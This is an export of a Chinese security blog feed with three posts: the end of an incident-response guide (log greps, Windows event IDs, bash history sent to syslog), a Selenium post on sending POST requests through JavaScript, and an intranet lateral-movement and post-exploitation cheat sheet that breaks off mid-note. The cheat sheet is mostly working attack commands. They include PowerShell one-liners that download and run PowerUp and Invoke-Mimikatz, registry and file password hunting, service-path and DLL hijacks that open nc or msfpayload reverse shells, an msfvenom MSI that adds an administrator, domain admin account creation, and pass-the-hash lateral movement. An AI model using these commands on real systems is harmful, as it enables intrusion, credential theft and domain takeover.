    <p>如果服务器中存在恶意的二进制文件，需要对二进制文件进行分析。使用IDA Pro对恶意文件进行静态分析，使用在线文件分析平台（金山火眼、文件B超、virustotal等等）对恶意文件进行动态分析。结合两者的分析结果判定恶意文件的行为，例如是否会对服务器系统文件进行替换？是否感染了系统其他关键文件？是否将自身写入开机启动项？同时可以将恶意文件的md5值放到网上搜索看看有没有人已经对该恶意文件进行过分析。</p>
  </li>
  <li>
    <p>确定此次事件的影响大小。</p>
  </li>
  <li>报告</li>
</ul>

<h3 id="基本应急建议">基本应急建议</h3>

<p>Kill恶意进程：</p>
<blockquote>
  <p>32位用wsyscheck，从自启动、服务里找，最重要的是杀白金这类注入进程的需要他的卸载模块功能，你kill进程立即重启。</p>
</blockquote>

<blockquote>
  <p>64位任务管理器加注册表编辑器足够了，右键转至服务非常好用，除了挖矿的，其他的木马后门都会*32，直接kill，kill不了的注册表里改了然后重启。</p>
</blockquote>

<p>WEBSHELL寻找：</p>

<blockquote>
  <p>1）扫描特征
通常日志中会伴随一些其他攻击特征，例如可以用如下语句
egrep ‘(select|script|acunetix|sqlmap)’ /var/log/httpd/access_log</p>
</blockquote>

<blockquote>
  <p>2）访问频次
重点关注POST请求
grep ‘POST’ /var/log/httpd/access_log | awk ‘{print $1}’ | sort | uniq -c | sort -nr</p>
</blockquote>

<blockquote>
  <p>3）Content-Length
Content-Length过大的请求，例如过滤Content-Length大于5M的日志
awk ‘{if($10&gt;5000000){print $0}}’ /var/log/httpd/access_log</p>
</blockquote>

<blockquote>
  <p>注意
这里如果发现文件，不要直接用vim查看编辑文件内容，这样会更改文件的mtime，而对于应急响应来说，时间点很重要。对比时间点更容易在Log找到其他的攻击痕迹。</p>

</blockquote>

<p>基本建议：</p>
<blockquote>
  <p>C:\Users\XXX\Desktop 新建用户的桌面，可能会有残留文件
查看杀毒软件日志
查看安全性日志，是否存在大量审核失败的日志（暴力破解）若该帐号本身已被删除，则”用户”处将不会显示帐号名，而是显示一串帐号的SID值。
查看安全性日志，特殊事件，比如说648特殊事件为创建账户事件</p>
</blockquote>

<p>这里列举一些有关检测时常见的事件ID:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>事件ID：517     审核日志已经清除
事件ID：528     登陆成功                      可以显示客户端连接ip地址
事件ID：529   登录失败。试图使用未知的用户名或已知用户名但错误密码进行登录
事件ID：683     会话从 winstation 中断连接     可以查看客户端计算机名
事件ID：624     创建了用户帐户
事件ID：626     启用了用户帐户
事件ID：627     用户密码已更改
事件ID：628     设置了用户密码
事件ID：630   用户帐户已删除。
事件ID：632： 成员已添加至全局组
事件ID：635： 已新建本地组。 
事件ID：643： 域策略已修改。
</code></pre>
</div>
<p>必要时配置下history</p>

<p>1、命令历史记录中加时间</p>

<div class="highlighter-rouge"><pre class="highlight"><code>默认情况下如下图所示，没有命令执行时间，不利于审计分析。

通过设置export HISTTIMEFORMAT='%F %T '，让历史记录中带上命令执行时间。

注意”%T”和后面的”’”之间有空格，不然查看历史记录的时候，时间和命令之间没有分割。

要一劳永逸，这个配置可以写在/etc/profile中，当然如果要对指定用户做配置，这个配置可以写在/home/$USER/.bash_profile中。

本文将以/etc/profile为例进行演示。

要使配置立即生效请执行source /etc/profile，我们再查看history记录，可以看到记录中带上了命令执行时间。

如果想要实现更细化的记录，比如登陆过系统的用户、IP地址、操作命令以及操作时间一一对应，可以通过在/etc/profile里面加入以下代码实现

export HISTTIMEFORMAT="%F %T 'who -u am i 2&gt;/dev/null| awk '{print $NF}'|sed -e 's/[()]//g ''whoami' "，注意空格都是必须的。

修改/etc/profile并加载后，history记录如下，时间、IP、用户及执行的命令都一一对应。

通过以上配置，我们基本上可以满足日常的审计工作了，但了解系统的朋友应该很容易看出来，这种方法只是设置了环境变量，攻击者unset掉这个环境变量，或者直接删除命令历史，对于安全应急来说，这无疑是一个灾难。

针对这样的问题，我们应该如何应对，下面才是我们今天的重点，通过修改bash源码，让history记录通过syslog发送到远程logserver中，大大增加了攻击者对history记录完整性破坏的难度。
</code></pre>
</div>

<p>2、修改bash源码，支持syslog记录</p>

<div class="highlighter-rouge"><pre class="highlight"><code>首先下载bash源码，可以从gnu.org下载，这里不做详细说明了，系统需要安装gcc等编译环境。我们用bash4.4版本做演示。

修改源码：bashhist.c

修改源码config-top.h，取消/#define SYSLOG_HISTORY/这行的注释

编译安装，编译过程不做详细说明，本文中使用的编译参数为： ./configure –prefix=/usr/local/bash，安装成功后对应目录如下：

此时可以修改/etc/passwd中用户shell环境，也可以用编译好的文件直接替换原有的bash二进制文件，但最好对原文件做好备份。

替换时要注意两点:

1、一定要给可执行权限，默认是有的，不过有时候下载到windows系统后，再上传就没有可执行权限了，这里一定要确定，不然你会后悔的；

2、替换时原bash被占用，可以修改原用户的bash环境后再进行替换。

查看效果，我们发现history记录已经写到了/var/log/message中。

如果要写到远程logserver，需要配置syslog服务，具体配置这里不做详细讲解，大家自己研究，发送到远端logserver效果如下图所示。

通过以上手段，可以有效保证history记录的完整性，避免攻击者登录系统后，通过取消环境变量、删除history记录等方式抹掉操作行为，为安全审计、应急响应等提供了完整的原始数据
</code></pre>
</div>

<h4 id="后记">后记</h4>

<p>本文将持续更新，将作者遇到的一些应急的内容和技巧添加到里面，其中有部分内容参考了各大安全论坛的资料，再次感谢其他作者的付出。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[关于selenium的post方法思考]]></title>
      <url>/spider/2018/04/18/selenium-post-func/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>Selenium是一款比较常见的web应用自动化测试系统，它支持多种浏览器，多用于在爬虫中解决JavaScript渲染问题。</strong></span>
	
</p>

<p>当requests，urllib*无法正常获取网页内容的时候，用它模拟浏览器进行网页加载，可以得到一些无法直接在网页源代码里面看到的内容。</p>

<p>利用selenium及其相关的库，笔者大概尝试过搭配headless chrome、headless firefox，以及快要凉凉的过气选手phantomjs。这几种无界面浏览器当然各有千秋，这里不做过多评论。</p>

<p>由于selenium原生代码似乎是不带post方式的，故此在测试用例时，很是费了一些精力。在这里，笔者会以headless firefox模式为例，简单谈一下在selenium下如何进行post数据。</p>

<h4 id="第三方库">第三方库</h4>

<p>以seleniumrequests为例，这个库是一个selenium扩展，使得selenium下也可以使用requests的功能，我们可以采用pip安装：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>pip install selenium-requests
</code></pre>
</div>
<p>当然，这个库使用起来也是很简单的：</p>
<div class="highlighter-rouge"><pre class="highlight"><code># selenium.webdriver from the seleniumrequests module
from seleniumrequests import Firefox

# Simple usage with built-in WebDrivers:
webdriver = Firefox()
response = webdriver.request('GET', 'https://www.google.com/')
print(response)
</code></pre>
</div>
<p>不过这个库也有它的缺点，不方便自定义一些驱动参数，无法设置headless状态（也许是我没找到方法）。有兴趣的朋友可以自行研究下，其支持方法如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; dir(seleniumrequests)
['Android', 'Chrome', 'Firefox', 'Ie', 'Opera', 'PhantomJS', 'Remote', 'RequestMixin', 'Safari', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '__path__', '__warningregistry__', 'request']
</code></pre>
</div>

<p>想象一下画面，爬一次页面弹就会给你弹一个浏览器出来，这TM真酸爽。</p>

<h4 id="html点击大法好">HTML点击大法好</h4>

<p>个人不太喜欢这种法子，不过好像有一部分人比较推崇。其原理是解析post请求后，将其传递的参数重构为form表单，最后再将这些新生成的代码存入html网页。</p>

<p>最后，会再借用selenium定位submit元素，触发事件提交表单。</p>

<p>窃以为这种方法不太妥帖，每开一个网页程序就得生成一个新的html文件。先不论程序是否一定具有写入和删除的权限，如果运行的次数增多后，明显会增加机器负担。</p>

<h4 id="ajax代行天子令">Ajax代行天子令</h4>

<p>Ajax模拟post发送请求，这是笔者自己采用的办法。当然，不一定是最好的。</p>

<p>无论是原生JS的XMLHttpRequest，还是Jquery，都可以模拟生成ajax post请求，最后再借助selenium执行JS代码。</p>

<p>XMLHttpRequest示例片段：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>brower = webdriver.Firefox(firefox_options=fireFoxOptions)
js = """var xmlhttp=new XMLHttpRequest();
        xmlhttp.open("GET","http://127.0.0.1/phproot/echo.php",false);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xmlhttp.setRequestHeader("X-Forwarded-For","test");
        xmlhttp.setRequestHeader("Referer","test");
        xmlhttp.setRequestHeader("User-Agent","Mozilla/5.0");
        xmlhttp.setRequestHeader("Cookie","");
        xmlhttp.send("test=1");
        return xmlhttp.responseText;
	    """ 
brower.implicitly_wait(30)
#time.sleep(30)
resp = brower.execute_script(js)
</code></pre>
</div>
<p>Jquery示例片段：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>jquery = open("jquery.min.js", "r").read()

driver = webdriver.Firefox(firefox_options=fireFoxOptions)
driver.execute_script(jquery)

ajax_query = '''
            $.ajax('%s', {
            type: %s,
            data: %s, 
            headers: { "User-Agent": "Mozilla/5.0" },
            crossDomain: true,
            xhrFields: {
             withCredentials: true
            },
            success: function(){}
            });
            ''' % (url, request_type, data)

ajax_query = ajax_query.replace(" ", "").replace("\n", "")
resp = driver.execute_script("return " + ajax_query)
</code></pre>
</div>
<p>但这样做还是有缺陷，通过driver.get预访问一次将要请求的URL，我们能解决跨域的问题。</p>

<p>但是由于w3g的安全设定，我们无法自行在JS中预置cookie（可以通过传递解决）、Referer等等危险的头部参数。</p>

<p>如若我们需要fuzz请求包头部一些冷门的参数，这样使用就会有一定的局限性。</p>

<h4 id="尾声">尾声</h4>

<p>总而言之，selenium没有自带原生post方式是一个遗憾，而且其调用headless模式的浏览器，渲染和启动也显得太慢了些，无法用于高并发。</p>

<p>还是那句话，个人觉得在资源有限的情况下，它不太适用于高并发的大规模测试，fuzz指定的一定量payload也许尚可。</p>
]]></content>
      <categories>
        
          <category> spider </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[内网横向与后渗透辞典]]></title>
      <url>/pentest/2018/01/18/pentest-innet-and-permission-maintenance/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>在内网横向与后渗透的过程中，会有一些细节比较蛋疼。而真正系统地讲述内网和后渗透的书籍，也就那么寥寥几本，就算想掏大美刀也没地儿买去。</strong></span>
</p>

<p>换而言之，无论做什么都需要积累。在这篇文章中，鄙人将根据个人库存和网上参考资料做一些总结。</p>

<p>学无止境，我在以后还会做一些引用和补充，希望能提升自我和帮助有缘人。</p>

<h3 id="取得突破口">取得突破口</h3>

<p>在外网进入内网时，我们可能需要一个突破口，可能会存在以下几种情况：</p>

<ul>
  <li>通过SQL注入获取shell。</li>
  <li>通过命令执行获取shell。</li>
  <li>通过前后台上传恶意脚本直接获取webshell</li>
  <li>通过上传解析进行命令执行（csv、xml和shtml等）。</li>
  <li>通过未授权代理和弱/默认口令VPN获取入口。</li>
  <li>通过CSRF写shell。</li>
  <li>通过XSS作为代理，探测内网。</li>
  <li>钓鱼获得shell。</li>
</ul>

<h3 id="提取信息">提取信息</h3>

<h5 id="windows信息提取">Windows信息提取</h5>

<p>查看基本信息：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>set | systeminfo (环境变量及补丁信息)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

#(已知的主机名/是否开启默认共享/有无特殊服务)
#此处可以加上 /domain
net users | net view | net share | net start |net group 

#查看加入到域内的所有计算机名
net group "domain computers" /domain 

#查看域控制器
net group "domain controllers" /domain 

#查看指定用户
net user hacker /domain

#获得域密码策略设置，密码长短，错误锁定等信息
net accounts /domain 


route print 查看路由
arp -A 查看路由表

netstat -ano | tasklist /svc (查看进程所开端口)

query user (当前在线的用户状态)

schtasks /query /fo LIST /v 查看计划任务

net user administrator
(查看最近更改密码时间，有可能只是在原密码的基础上做了简单变换, 比如把xxx@2016换成xxx@2017)

netsh firewall show state | netsh firewall show config | netsh advfirewall firewall show rule name=all (cmd下查看防火墙配置)

手动到处翻翻翻：
txt/doc/xls/ppt

查询含有特定文件名和内容的文件：
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

注册表里查询：
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

#能得到部分工作站和域敏感信息
net config workstation

#有正确返回则为域用户
net time /domain


</code></pre>
</div>
<p>枚举提权：</p>

<p>一般是通过脚本枚举补丁，然后输出MS-***，市面上工具比较杂，这里不一一列举。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

https://github.com/GDSSecurity/Windows-Exploit-Suggester

</code></pre>
</div>

<h5 id="linux信息提取">Linux信息提取</h5>

<p>查看基本信息：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ps auxfww (查看进程详细信息)
netstat -tlnp (所有监听的TCP端口)
netstat -antp | ss -antp (所有活动的TCP连接, 分析哪些IP与当前主机有关联)
cat /etc/issue /etc/*release /proc/version (系统版本信息)
cat /etc/passwd (查看用户配置, 哪些用户可以登陆系统)
cat /etc/hosts (主机名解析配置, 一般这里的IP都是跟当前主机关联度比较高的)
cat /etc/resolv.conf (查看DNS服务器IP, 内网DNS服务器存在域传输漏洞的可能性较高)
id; uname -a; hostname; w; who; lastlog
</code></pre>
</div>
<p>查看敏感信息【也用于应急】：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>cat /root/.bash_history | grep -Ei -C 2 'ssh|mysql|ftp|scp|su|root|passwd' (过滤历史命令记录中的敏感关键字,显示上下各两行)
loacte passwd; locate shadow; locate config.*(properties等配置文件后缀); locate .bash_history; locate .mysql_history; locate authorized_keys
find / -perm +6000 -ls 2&gt;/dev/null | grep -v proc (查找具有SUID/SGID权限的文件和目录)
find / -writable -ls 2&gt;/dev/null | grep -v proc (查找对当前用户具有写权限的文件和目录)
cat /etc/crontab (计划任务中的执行脚本是否有修改权限)
sudo -l (查看当前用户具有哪些sudo权限)
sudo -V (某些版本的sudo存在提权漏洞)
ls -latr /etc/ (查看哪些配置文件最近被修改过)
ls -l /etc/shadow* (查看shadow文件是否有备份, 权限配置是否正确)
cat /etc/security/opasswd (保存了曾经使用过的密码hash)
</code></pre>
</div>

<p>内核提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>CentOS 2.6.32 (2013年之前)
https://www.exploit-db.com/exploits/25444/
CVE-2010-3847 (RHEL5版本)
https://www.nigesb.com/cve-2010-3847-exp-centos.html
https://www.exploit-db.com/exploits/25444/
</code></pre>
</div>

<p>枚举提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>searchsploit (本地搜索漏洞库)
linuxprivchecker.py (自动检测提权漏洞的脚本)
</code></pre>
</div>

<h5 id="密码获取">密码获取</h5>

<p>注册表读取自动登陆帐户密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>(cmd) reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
(msf) post/windows/gather/credentials/windows_autologin
</code></pre>
</div>

<p>powershell篇：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>1.Empire 【综合渗透工具，类似于msf】
可以生成木马，信息收集，提权，横向渗透以及后门
https://github.com/EmpireProject/Empire.git

2.PowerUp 提权神器
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://192.168.31.247/PowerUp.ps1');Invoke-AllChecks”
powershell -exec bypass -Command "&amp; {Import-Module .PowerUp.ps1; Invoke-AllChecks}"

3.PowerView 域渗透神器
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

</code></pre>
</div>

<p>powershell读取系统密码【示例，需要xp和2003以上的系统才自带powershell】：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe -exec bypass -Command "&amp; {Import-Module .\powerview.ps1;Invoke-UserHunter}"
powershell===&gt;Import-Module .\powerview.ps1 ===&gt;Invoke-UserHunter
</code></pre>
</div>

<p>导出系统密码或者hash,在导出域hash部分有详细介绍：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter/mimikatz/pwdump7/wce/Getpwd_k8/QuarksPwDump
https://github.com/gentilkiwi/mimikatz/
</code></pre>
</div>

<p>重启记录密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>更新KB2871997补丁后，可禁用Wdigest Auth强制系统的内存不保存明文口令。这时需要修改注册表键值，启用Wdigest Auth，自动锁屏，等待用户重新登录判断当前锁屏状态，用户解锁登录后立即导出明文口令：
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
</code></pre>
</div>

<p>Meterpreter获取所有用户的hash：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>1.msf有两个模块可以使用，一个是hashdump，此模块只能导出本地的hash，大家测试就可以知道了，另外一个是smart_hashdump,此模块可以用来导出域用户的hash。
</code></pre>
</div>
<p>powershell有可以直接导出的模块，大家自行尝试一下。</p>

<p>win2012修改注册表，再次登录可获取密码：</p>
<blockquote>
  <p>需要HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest的”UseLogonCredential”设置为1，类型为DWORD 32才可以，然后下次用户再登录，就能记录到明文密码了。</p>
</blockquote>

<blockquote>
  <p>在不存在该字段时，添加UseLogonCredential就行。</p>
</blockquote>

<p>导出部分重要第三方软件密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>k8getteamviewpwd
http://qqhack8.blog.163.com/blog/static/11414798520156543210624/

浏览器密码读取（多种）

多种读取密码工具
http://www.nirsoft.net/

Teamview读取密码工具【吐司版】

winscp还原明文密码
post/windows/gather/credentials/winscp

Get-GPPPassword(PS)
获取AD域中SYSVOL和组策略首选项中的密码
https://xianzhi.aliyun.com/forum/topic/1653/

Unattended Installs
自动安装允许程序残留xml，全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中。除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件：

C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\

MSF module：post/windows/gather/enum_unattend
</code></pre>
</div>

<p>LAPS获取密码：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://wooyun.jozxing.cc/static/drops/tips-10496.html
</code></pre>
</div>

<p>在线破解hash网站：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://www.objectif-securite.ch/en/ophcrack.php
http://www.cmd5.com
这尼玛太少了，谁帮我加点。

</code></pre>
</div>
<p>离线破解：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ophcrack/hashcat/john the ripper

hashcat 可以组合字典破解，还可以根据规则处理字典
https://hashcat.net/wiki/doku.php?id=mask_attack
/usr/share/hashcat/rules/ 目录存放了默认的规则文件。
</code></pre>
</div>

<h3 id="win提升权限">Win提升权限</h3>

<p>检查是否存在可以提权的第三方应用：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>serv-u/filezilla/flashfxp/winscp/mysql/mssql/radmin
</code></pre>
</div>

<p>服务配置不当提权：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>有的服务以system权限运行, 但是权限配置不当, 导致普通用户可以通过 sc config 修改程序路径。

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

查看权限
#这个也行
icacls "C:\Program Files (x86)\Privacyware"

sc qc Spooler【某示例程序】
accesschk.exe -ucqv Spooler
accesschk.exe -ucqv *

===================================
#正题在下面
accesschk.exe -uwcqv "Authenticated Users" *
#结果查出来是upnphost
accesschk.exe -ucqv upnphost

sc qc upnphost
sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
#弹出shell

#测试是否everyone有权限
icacls "C:Program Files\Program Folder\A Subfolder\OmniServers.exe"
#Install-ServiceBinary模块，通过Write-ServiceBinary写一个C#的服务用来添加用户:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'OmniServers'-UserName shuteer -Password Password123!


#提权成功以后我们需要清除入侵的痕迹，把所有的状态恢复到最初的状态，可以使用如下命令恢复：
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Restore-ServiceBinary -ServiceName 'OmniServers'

#漏洞利用原理：该漏洞产生的原因是因为用户开启了windows installer特权安装功能:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1'); Get-RegistryAlwaysInstallElevated
#检测注册表是否设置，得到true【好像False也能继续】
运行Write-UserAddMSI模块，运行后生成文件UserAdd.msi
#普通用户运行：
msiexec /q /i UserAdd.msi
</code></pre>
</div>

<p>劫持提权:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>有的服务程序路径包含空格, 且路径没有被引号包含, 利用Windows寻找可执行文件的顺序, 劫持启动自定义程序。
http://www.greyhathacker.net/?p=738
http://www.freebuf.com/vuls/87463.html

echo %path%
accesschk.exe -dqv "C:\Python27"
cacls "C:\Python27"

msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D &gt; 
/root/Desktop/evil.dll
copy evil.dll C:\Python27\wlbsctrl.dll
#重启生效

#也可以看看计划任务里有没有可疑目录
#比如出现了
#Task To Run:        E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out  E:\GrabLogs\Logs\log.txt
accesschk.exe -dqv "E:\GrabLogs"
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t
exe &gt; /root/Desktop/evil-tftp.exe
copy evil-tftp.exe E:\GrabLogs\tftp.exe

#命令行下第一次运行需要同意一个许可，如果不想出现那个提示窗口，则可以执行：
accesschk.exe /accepteula

#找弱权限目录
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

##找弱权限文件
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*


SC创建服务执行
1、系统权限(其中test为服务名)
sc \\DC1 create test binpath= c:\cmd.exe
sc \\DC1 start test
sc \\DC1 delete test

2.指定用户权限启动
sc \\DC1 create test binpath = "c:\1.exe" obj= "centoso\administrator" passwrod= test
sc \\DC1 start test

</code></pre>
</div>

<p>AlwaysInstallElevated：</p>

<blockquote>
  <p>AlwaysInstallElevated是微软允许非授权用户以SYSTEM权限运行安装文件(MSI)的一种设置。然而，给予用于这种权利会存在一定的安全隐患，因为如果这样做下面两个注册表的值会被置为”1”。</p>
</blockquote>

<p>查询命令如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre>
</div>
<p>Note：如果这条命令出错类似于：”The system was unable to find the specified registry key or value”，这可能是组策略里AlwaysInstallElevated没有被定义，因此不存在相关联的注册表项。</p>

<p>现在我们假设AlwaysInstallElevated已经启用了，我们可以利用MSFVenom工具来生成一个在目标机器上增加管理员用户的MSI安装文件：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
</code></pre>
</div>
<p>当我们在目标机器上加载了新生成的MSI文件后，我们可以使用Windows命令行工具Msiexec进行安装：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
</code></pre>
</div>
<p>Note:使用MSFVenom创建MSI文件时使用了always_install_elevated模块，那么在安装过程中会失败。这是因为操作系统会阻止未注册的安装。</p>

<p>下面的模块效果相同：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>exploit/windows/local/always_install_elevated
</code></pre>
</div>

<p>使用Veil生成免杀payload：</p>

<blockquote>
  <p>这个按照提示走就行了，具体的查查资料。</p>
</blockquote>

<p>msf在meterpreter下的bypassuac尝试：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>use exploit/windows/local/bypassuac_eventvwr
#seach bypassuac
</code></pre>
</div>

<p>Meterpreter的post模块使用：</p>

<blockquote>
  <p>全都是后渗透模块，search post可得部分，在获取一定权限的session后，直接run即可。</p>
</blockquote>

<p>迁移进程获得权限：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>PS 查看域管理所在的进程
Migrate pid注入进程
</code></pre>
</div>

<p>从IPC$到域控【尼玛这得多好的运气】：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>继续经典的IPC$到域控

Meterpreter下面shell

Net use \\域控ip\c$

Net time \\域控ip

Copy bat.bat \\域控ip\c$

At \\域控ip time c:\bat.bat

通往成功的路不只有一条，添加域管账户

Net user demo demo /ad /domain

Net group “domain admins” demo /ad /domain

到了此刻，我们已经拥有域管权限了
</code></pre>
</div>

<h3 id="开启代理">开启代理</h3>

<p>获取10.10.1.1/24网段访问权限。
ssh动态转发 (本地开启socks代理)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ssh -qTfNCD 0.0.0.0:8081 root@10.10.1.110 (在10.10.2.120上执行)
</code></pre>
</div>

<p>外网机器IP可访问内网机3306：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>ssh -L 3306:外网机器ip:3306   user@隔离机器IP    -N
</code></pre>
</div>

<p>ssh静态转发 (通过本机10.10.3.130的20000端口可以获得10.10.1.1/24网段访问权限)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>ssh -qTfNCL 0.0.0.0:20000:10.10.2.120:8081 root@10.10.3.130
</code></pre>
</div>
<p>(通过10.10.3.130,将10.10.2.120的8081端口转发到本地20000端口)</p>

<p>metasploit:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>portfwd add -l 4445 -p 445 -r 10.10.10.111 (把内网另外一台主机的445端口转到在msf的4445端口)

msf开启socks4代理, 并添加内网路由, msf内部模块可直接通过session路由访问内网, 外部程序可通过socks4代理访问内网。

use auxiliary/server/socks4a | run (msf开启socks4代理, 默认是1080端口)
msf exploit(handler) &gt; sessions
Active sessions
===============
  Id  Type                     Information                                      Connection
  --  ----                     -----------                                      ----------
  1   meterpreter x86/windows  MICROSOF-CA98DC\Administrator @ MICROSOF-CA98DC  192.168.71.196:58308 -&gt; 192.168.71.167:443 (192.168.71.167)
msf exploit(handler) &gt; route add 192.168.71.196/24 1
[*] Route added
msf exploit(handler) &gt; route
IPv4 Active Routing Table
=========================
  Subnet             Netmask            Gateway
  ------             -------            -------
  192.168.71.196     255.255.255.0      Session 1
[*] There are currently no IPv6 routes defined。
msf exploit(handler) &gt;
</code></pre>
</div>

<h3 id="横向执行命令">横向执行命令</h3>

<div class="highlighter-rouge"><pre class="highlight"><code>net use x: \\[目标IP]\[地址] [域用户password] /user:[域]\[username]

(python版的psexec) psexec.py administrator:123456@192.168.71.165 -port 445

at \\192.168.200.100 15:00 c:\hack.bat

psexec \\192.168.1.2 c:\hack.bat【执行单条命令】
psexec \192.168.200.100 cmd【半交互shell】
</code></pre>
</div>

<p>上面是提供账号密码的情况，如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入【传递】，然后再执行WMIEXEC（不提供账号密码）就可以了。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password【半交互shell】
cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  "command"【执行单条命令】
</code></pre>
</div>
<p>wce注入hash后进行命令执行</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wce -s [hash] 
cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1
</code></pre>
</div>

<p>运行时间长的命令时，如ping,systeminfo之类的，记得加上-wait5000或者更久的时间选项。
运行nc反弹或者木马等不需要输出结果、同时需要一直运行的程序时，一定要加上-persist选项，不然你就只能去taskkill远程结束进程了。</p>

<p>使用NTLM hash远程连接：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>以管理员权限运行：
mimikatz "privilege::debug" "sekurlsa::pth /user:a /domain:test.local /ntlm:efa85b42d77dc2fdbdbdb767792b0a11"
dir \\192.168.40.132\c$
</code></pre>
</div>

<p>注:
虽然”sekurlsa::pth”在mimikatz中被称之为”Pass The Hash”,但是其已经超越了以前的”Pass The Hash”，部分人将其命名为”Overpass-the-hash”，也就是”Pass-the-key”</p>

<p>使用aes key远程连接（kb2871997 Installed）：
获取aes key 的mimikatz命令为：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::ekeys
</code></pre>
</div>

<p>无法复制时，开启日志记录功能后会把输出回显的内容保存在同级目录下的mimikatz.log中：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>mimikatz log privilege::debug sekurlsa::ekeys
</code></pre>
</div>

<p>以管理员权限运行：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>privilege::debug
sekurlsa::pth /user:a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c" 
privilege::debug
sekurlsa::pth /user:a /domain:test.local /aes128:8cce86e4b0630f07fcf5f2110068c421" 

dir \\WIN-8VVLRPIAJB0\c$
</code></pre>
</div>

<p>注意：</p>

